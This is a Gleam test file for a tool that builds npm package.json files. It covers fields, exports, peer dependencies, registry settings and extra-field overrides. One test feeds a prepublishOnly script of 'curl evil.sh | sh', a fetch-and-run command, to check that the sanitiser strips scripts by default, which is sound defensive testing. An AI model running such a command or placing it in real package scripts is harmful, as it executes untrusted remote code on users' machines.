import gleam/json
import gleam/list
import gleam/option.{None, Some}
import gleam/set
import gleam/string
import startest/expect
import talc/gleam_toml.{type GleamConfig, GleamConfig, Repository}
import talc/package_json
import talc/talc_config.{type TalcConfig, PackageConfig, TalcConfig}

fn test_gleam_config() -> GleamConfig {
  GleamConfig(
    name: "my_lib",
    version: "1.0.0",
    description: "A test library",
    licences: ["MIT"],
    repository: Ok(Repository(type_: "github", user: "myorg", repo: "my_lib")),
  )
}

fn test_talc_config() -> TalcConfig {
  talc_config.default()
}

pub fn generate_basic_package_json_test() {
  let gleam = test_gleam_config()
  let talc = test_talc_config()

  let json = package_json.generate(gleam, talc) |> expect.to_be_ok()
  json |> expect.to_not_equal("")
  // Check required fields are present
  json |> string_contains("\"name\":\"my_lib\"") |> expect.to_be_true()
  json |> string_contains("\"version\":\"1.0.0\"") |> expect.to_be_true()
  json |> string_contains("\"type\":\"module\"") |> expect.to_be_true()
  json |> string_contains("\"license\":\"MIT\"") |> expect.to_be_true()
}

pub fn generate_esm_exports_test() {
  let gleam = test_gleam_config()
  let talc = test_talc_config()

  let json = package_json.generate(gleam, talc) |> expect.to_be_ok()
  json |> string_contains("./dist/my_lib.mjs") |> expect.to_be_true()
  // Default config has use_true_myth=true but no wrapped modules → native .d.mts
  json |> string_contains("./dist/my_lib.d.mts") |> expect.to_be_true()
  json |> string_contains("\"exports\"") |> expect.to_be_true()
}

pub fn generate_with_scope_test() {
  let gleam = test_gleam_config()
  let talc =
    TalcConfig(
      ..test_talc_config(),
      package: PackageConfig(
        scope: Some("@myorg"),
        registry: None,
        output_dir: "npm_dist",
        unsafe_allow_scripts: False,
      ),
    )

  let json = package_json.generate(gleam, talc) |> expect.to_be_ok()
  json |> string_contains("\"name\":\"@myorg/my_lib\"") |> expect.to_be_true()
}

pub fn generate_repository_github_test() {
  let gleam = test_gleam_config()
  let talc = test_talc_config()

  let json = package_json.generate(gleam, talc) |> expect.to_be_ok()
  json
  |> string_contains("https://github.com/myorg/my_lib")
  |> expect.to_be_true()
}

pub fn generate_no_repository_test() {
  let gleam = GleamConfig(..test_gleam_config(), repository: Error(Nil))
  let talc = test_talc_config()

  let json = package_json.generate(gleam, talc) |> expect.to_be_ok()
  json |> string_contains("\"repository\"") |> expect.to_be_false()
}

pub fn generate_no_description_test() {
  let gleam = GleamConfig(..test_gleam_config(), description: "")
  let talc = test_talc_config()

  let json = package_json.generate(gleam, talc) |> expect.to_be_ok()
  json |> string_contains("\"description\"") |> expect.to_be_false()
}

pub fn generate_no_license_test() {
  let gleam = GleamConfig(..test_gleam_config(), licences: [])
  let talc = test_talc_config()

  let json = package_json.generate(gleam, talc) |> expect.to_be_ok()
  json |> string_contains("\"license\"") |> expect.to_be_false()
}

pub fn generate_with_peer_deps_test() {
  let gleam = test_gleam_config()
  let talc =
    TalcConfig(..test_talc_config(), peer_dependencies: [
      #("react", ">=18"),
      #("react-dom", ">=18"),
    ])

  let json = package_json.generate(gleam, talc) |> expect.to_be_ok()
  json |> string_contains("\"peerDependencies\"") |> expect.to_be_true()
  json |> string_contains("\"react\"") |> expect.to_be_true()
}

pub fn generate_with_extra_fields_test() {
  let gleam = test_gleam_config()
  let talc =
    TalcConfig(..test_talc_config(), extra_fields: [
      #("homepage", json.string("https://example.com")),
    ])

  let result = package_json.generate(gleam, talc) |> expect.to_be_ok()
  result |> string_contains("\"homepage\"") |> expect.to_be_true()
  result |> string_contains("https://example.com") |> expect.to_be_true()
}

pub fn sanitize_extras_strips_scripts_by_default_test() {
  let talc =
    TalcConfig(..test_talc_config(), extra_fields: [
      #("homepage", json.string("https://example.com")),
      #(
        "scripts",
        json.object([#("prepublishOnly", json.string("curl evil.sh | sh"))]),
      ),
    ])

  let #(sanitized, warnings) = package_json.sanitize_extras(talc)

  sanitized.extra_fields
  |> keys_only()
  |> expect.to_equal(["homepage"])
  warnings |> expect.to_not_equal([])
  let assert [warning] = warnings
  warning
  |> string_contains("scripts")
  |> expect.to_be_true()
  warning
  |> string_contains("unsafe_allow_scripts")
  |> expect.to_be_true()
}

pub fn sanitize_extras_keeps_scripts_when_opted_in_test() {
  let talc =
    TalcConfig(
      ..test_talc_config(),
      package: PackageConfig(
        ..test_talc_config().package,
        unsafe_allow_scripts: True,
      ),
      extra_fields: [
        #("scripts", json.object([#("test", json.string("vitest"))])),
      ],
    )

  let #(sanitized, warnings) = package_json.sanitize_extras(talc)

  sanitized.extra_fields
  |> keys_only()
  |> expect.to_equal(["scripts"])
  warnings |> expect.to_equal([])
}

pub fn sanitize_extras_no_scripts_no_warnings_test() {
  let talc =
    TalcConfig(..test_talc_config(), extra_fields: [
      #("homepage", json.string("https://example.com")),
    ])

  let #(sanitized, warnings) = package_json.sanitize_extras(talc)

  sanitized.extra_fields
  |> keys_only()
  |> expect.to_equal(["homepage"])
  warnings |> expect.to_equal([])
}

fn keys_only(fields: List(#(String, json.Json))) -> List(String) {
  list.map(fields, fn(pair) { pair.0 })
}

pub fn validate_valid_config_test() {
  let gleam = test_gleam_config()
  let _ = package_json.validate(gleam) |> expect.to_be_ok()
  Nil
}

pub fn validate_missing_name_test() {
  let gleam = GleamConfig(..test_gleam_config(), name: "")
  let _ = package_json.validate(gleam) |> expect.to_be_error()
  Nil
}

pub fn validate_missing_version_test() {
  let gleam = GleamConfig(..test_gleam_config(), version: "")
  let _ = package_json.validate(gleam) |> expect.to_be_error()
  Nil
}

pub fn check_report_valid_test() {
  let gleam = test_gleam_config()
  let talc = test_talc_config()

  let report = package_json.check_report(gleam, talc)
  report |> string_contains("✓ Package: my_lib") |> expect.to_be_true()
  report |> string_contains("✓ Version: 1.0.0") |> expect.to_be_true()
}

fn string_contains(haystack: String, needle: String) -> Bool {
  string.contains(haystack, needle)
}

pub fn extra_fields_override_version_test() {
  let gleam = test_gleam_config()
  let talc =
    TalcConfig(..test_talc_config(), extra_fields: [
      #("version", json.string("2.0.0-beta.1")),
    ])

  let result = package_json.generate(gleam, talc) |> expect.to_be_ok()
  result
  |> string_contains("\"version\":\"2.0.0-beta.1\"")
  |> expect.to_be_true()
  // The original version should NOT appear
  result |> string_contains("\"version\":\"1.0.0\"") |> expect.to_be_false()
}

pub fn extra_fields_override_name_test() {
  let gleam = test_gleam_config()
  let talc =
    TalcConfig(..test_talc_config(), extra_fields: [
      #("name", json.string("custom-name")),
    ])

  let result = package_json.generate(gleam, talc) |> expect.to_be_ok()
  result |> string_contains("\"name\":\"custom-name\"") |> expect.to_be_true()
  result |> string_contains("\"name\":\"my_lib\"") |> expect.to_be_false()
}

pub fn extra_fields_array_values_test() {
  let gleam = test_gleam_config()
  let talc =
    TalcConfig(..test_talc_config(), extra_fields: [
      #(
        "keywords",
        json.preprocessed_array([json.string("gleam"), json.string("beam")]),
      ),
    ])

  let result = package_json.generate(gleam, talc) |> expect.to_be_ok()
  result |> string_contains("\"keywords\"") |> expect.to_be_true()
  result |> string_contains("\"gleam\"") |> expect.to_be_true()
  result |> string_contains("\"beam\"") |> expect.to_be_true()
}

pub fn extra_fields_boolean_values_test() {
  let gleam = test_gleam_config()
  let talc =
    TalcConfig(..test_talc_config(), extra_fields: [
      #("private", json.bool(True)),
    ])

  let result = package_json.generate(gleam, talc) |> expect.to_be_ok()
  result |> string_contains("\"private\":true") |> expect.to_be_true()
}

pub fn extra_fields_nested_object_test() {
  let gleam = test_gleam_config()
  let talc =
    TalcConfig(..test_talc_config(), extra_fields: [
      #(
        "author",
        json.object([
          #("name", json.string("Test Author")),
          #("email", json.string("test@example.com")),
        ]),
      ),
    ])

  let result = package_json.generate(gleam, talc) |> expect.to_be_ok()
  result |> string_contains("\"author\"") |> expect.to_be_true()
  result |> string_contains("\"Test Author\"") |> expect.to_be_true()
}

pub fn generate_with_true_myth_peer_deps_test() {
  let gleam = test_gleam_config()
  let talc = test_talc_config()
  // Simulate wrapped modules → true-myth should be auto-added
  let wrapped = set.from_list(["my_lib"])

  let result =
    package_json.generate_with_modules(gleam, talc, [], wrapped)
    |> expect.to_be_ok()
  result |> string_contains("\"peerDependencies\"") |> expect.to_be_true()
  result |> string_contains("\"true-myth\"") |> expect.to_be_true()
}

pub fn generate_true_myth_peer_deps_no_override_explicit_test() {
  let gleam = test_gleam_config()
  let talc =
    TalcConfig(..test_talc_config(), peer_dependencies: [
      #("true-myth", ">=9.0.0"),
    ])
  let wrapped = set.from_list(["my_lib"])

  let result =
    package_json.generate_with_modules(gleam, talc, [], wrapped)
    |> expect.to_be_ok()
  // Explicit version should take precedence over auto-added
  result
  |> string_contains("\"true-myth\":\">=9.0.0\"")
  |> expect.to_be_true()
}

pub fn generate_no_true_myth_peer_deps_when_disabled_test() {
  let gleam = test_gleam_config()
  let talc = TalcConfig(..test_talc_config(), use_true_myth: False)
  let wrapped = set.new()

  let result =
    package_json.generate_with_modules(gleam, talc, [], wrapped)
    |> expect.to_be_ok()
  result |> string_contains("\"true-myth\"") |> expect.to_be_false()
}

pub fn generate_no_peer_deps_when_no_wrapped_modules_test() {
  let gleam = test_gleam_config()
  let talc = test_talc_config()
  let wrapped = set.new()

  let result =
    package_json.generate_with_modules(gleam, talc, [], wrapped)
    |> expect.to_be_ok()
  result |> string_contains("\"peerDependencies\"") |> expect.to_be_false()
}

pub fn generate_wrapper_paths_when_module_wrapped_test() {
  let gleam = test_gleam_config()
  let talc = test_talc_config()
  let wrapped = set.from_list(["my_lib"])

  let result =
    package_json.generate_with_modules(gleam, talc, ["my_lib"], wrapped)
    |> expect.to_be_ok()
  // Wrapper paths should be used for wrapped modules
  result
  |> string_contains("./dist/_wrapper/my_lib.mjs")
  |> expect.to_be_true()
  result
  |> string_contains("./dist/_wrapper/my_lib.d.ts")
  |> expect.to_be_true()
}

pub fn generate_native_paths_when_not_wrapped_test() {
  let gleam = test_gleam_config()
  let talc = TalcConfig(..test_talc_config(), use_true_myth: False)
  let wrapped = set.new()

  let result =
    package_json.generate_with_modules(gleam, talc, ["my_lib"], wrapped)
    |> expect.to_be_ok()
  // Native paths should be used
  result |> string_contains("./dist/my_lib.mjs") |> expect.to_be_true()
  result |> string_contains("./dist/my_lib.d.mts") |> expect.to_be_true()
}

pub fn generate_with_modules_requires_root_module_test() {
  let gleam = test_gleam_config()
  let talc = test_talc_config()
  // module_names is non-empty but does not contain "my_lib" (the package root)
  let result =
    package_json.generate_with_modules(gleam, talc, ["my_lib/child"], set.new())
  let err = result |> expect.to_be_error()
  err |> expect.to_equal(package_json.MissingRootModule("my_lib"))
}

pub fn generate_with_modules_full_output_overrides_bypass_root_module_test() {
  let gleam = test_gleam_config()
  // extra_fields overrides all four entrypoint/export fields
  let talc =
    TalcConfig(..test_talc_config(), extra_fields: [
      #("exports", json.object([#(".", json.string("./custom.mjs"))])),
      #("main", json.string("./custom.mjs")),
      #("module", json.string("./custom.mjs")),
      #("types", json.string("./custom.d.ts")),
    ])
  // module_names is non-empty but root module is absent — should still succeed
  let result =
    package_json.generate_with_modules(gleam, talc, ["my_lib/child"], set.new())
  result |> expect.to_be_ok()
  Nil
}

pub fn generate_with_modules_partial_overrides_still_fail_test() {
  let gleam = test_gleam_config()
  // Only "exports" is overridden — not all four fields
  let talc =
    TalcConfig(..test_talc_config(), extra_fields: [
      #("exports", json.object([#(".", json.string("./custom.mjs"))])),
    ])
  let result =
    package_json.generate_with_modules(gleam, talc, ["my_lib/child"], set.new())
  let err = result |> expect.to_be_error()
  err |> expect.to_equal(package_json.MissingRootModule("my_lib"))
}

pub fn generate_with_modules_no_overrides_still_fail_test() {
  let gleam = test_gleam_config()
  let talc = test_talc_config()
  let result =
    package_json.generate_with_modules(
      gleam,
      talc,
      ["my_lib/child", "my_lib/other"],
      set.new(),
    )
  let err = result |> expect.to_be_error()
  err |> expect.to_equal(package_json.MissingRootModule("my_lib"))
}

pub fn check_report_with_modules_success_test() {
  let gleam = test_gleam_config()
  let talc = test_talc_config()

  let report =
    package_json.check_report_with_modules(
      gleam,
      talc,
      ["my_lib", "my_lib/sub"],
      set.new(),
    )
  report |> string_contains("✓ Package: my_lib") |> expect.to_be_true()
  report |> string_contains("✓ Version: 1.0.0") |> expect.to_be_true()
}

pub fn check_report_with_modules_missing_root_fails_test() {
  let gleam = test_gleam_config()
  let talc = test_talc_config()

  // module_names does not include "my_lib" root
  let report =
    package_json.check_report_with_modules(
      gleam,
      talc,
      ["my_lib/child"],
      set.new(),
    )
  report
  |> string_contains("Failed to generate package.json")
  |> expect.to_be_true()
}

pub fn generate_includes_publish_config_registry_test() {
  let gleam = test_gleam_config()
  let talc =
    TalcConfig(
      ..test_talc_config(),
      package: PackageConfig(
        ..talc_config.default().package,
        registry: Some("https://registry.example.com"),
      ),
    )
  let json = package_json.generate(gleam, talc) |> expect.to_be_ok()
  json
  |> string_contains("\"publishConfig\"")
  |> expect.to_be_true()
  json
  |> string_contains("\"registry\":\"https://registry.example.com\"")
  |> expect.to_be_true()
}

pub fn generate_registry_none_omits_publish_config_test() {
  let gleam = test_gleam_config()
  let talc = test_talc_config()
  let json = package_json.generate(gleam, talc) |> expect.to_be_ok()
  json |> string_contains("\"publishConfig\"") |> expect.to_be_false()
}

pub fn generate_empty_registry_omits_publish_config_test() {
  let gleam = test_gleam_config()
  let talc =
    TalcConfig(
      ..test_talc_config(),
      package: PackageConfig(
        ..talc_config.default().package,
        registry: Some(""),
      ),
    )
  let json = package_json.generate(gleam, talc) |> expect.to_be_ok()
  json |> string_contains("\"publishConfig\"") |> expect.to_be_false()
}

pub fn generate_extra_fields_publish_config_overrides_registry_test() {
  let gleam = test_gleam_config()
  let talc =
    TalcConfig(
      ..test_talc_config(),
      package: PackageConfig(
        ..talc_config.default().package,
        registry: Some("https://registry.example.com"),
      ),
      extra_fields: [
        #(
          "publishConfig",
          json.object([
            #("registry", json.string("https://custom.override.com")),
          ]),
        ),
      ],
    )
  let json = package_json.generate(gleam, talc) |> expect.to_be_ok()
  // extra_fields override wins
  json
  |> string_contains("\"https://custom.override.com\"")
  |> expect.to_be_true()
  // auto-generated registry should not appear
  json
  |> string_contains("\"https://registry.example.com\"")
  |> expect.to_be_false()
}
